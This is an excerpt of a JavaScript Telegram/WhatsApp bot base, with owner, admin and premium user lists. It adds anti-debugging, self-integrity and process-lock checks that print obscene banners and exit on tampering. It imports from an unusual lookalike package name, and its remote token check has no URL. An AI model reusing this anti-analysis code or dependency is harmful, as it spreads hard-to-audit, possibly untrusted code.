//Base Rich By @gaponback
import { Telegraf, RichMessage, Markup, 
session } from '@icanseeuanywhere/telekaf'
import fs from "fs";
import path from "path";
import moment from "moment-timezone";
import { exec } from "child_process";
import {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} from "@whiskeysockets/baileys";
import pino from "pino";
import chalk from "chalk";
import axios from "axios";
import readline from "readline";
import config from "./config.js";
const { BOT_TOKEN, OWNER_IDS } = config;
import crypto from "crypto";
const sessionPath = './session';
let bots = [];
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const premiumFile = "./Database/prem.json";
const adminFile = "./Database/edmin.json";
let secureMode = false;

const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};


const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Sorry, this feature is only for owners.");
  }
  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Sorry, this feature is only for admins..");
  }
  next();
};

const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const randomImages = [
"https://files.catbox.moe/2bfd29.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
             「〔 ACCES GRANTED 〕」
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
⠀        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

global.validateToken = async ( BOT_TOKEN) => {
  try {
    const res = await axios.get( { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(BOT_TOKEN)) {
      console.log(chalk.bold.red(`
        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
        「〔〕Fuck You Loser〔〕」 
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `));
    activateSecureMode();
